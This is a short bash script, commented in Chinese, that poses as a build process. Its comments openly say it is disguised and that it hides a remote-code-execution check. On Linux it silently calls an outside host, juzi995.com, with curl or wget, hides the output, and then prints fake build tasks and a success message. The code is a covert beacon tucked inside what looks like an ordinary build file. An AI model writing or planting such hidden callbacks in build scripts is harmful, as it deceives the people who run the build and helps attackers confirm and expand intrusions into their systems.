#!/bin/bash -x

# 伪装成正常构建操作
echo "[+] Starting build process..."
sleep 1
gcc --version || echo "GCC not found"

# 隐藏的RCE测试点 - 会请求你的VPS
curl_cmd() {
  # 使用两种方式确保请求成功
  (curl -fsS http://www.juzi995.com/test.html?src=rce_test || wget -qO- http://www.juzi995.com/test.html?src=rce_test) &>/dev/null
}

# 在复杂逻辑中隐藏调用
if [[ "$(uname)" == "Linux" ]]; then
  echo "Detected Linux system"
  curl_cmd
else
  echo "Unsupported OS"
fi

# 正常构建步骤
echo "[+] Running build tasks..."
for i in {1..3}; do
  echo "Task $i running..."
  sleep 0.5
done

echo "[✓] Build completed successfully"
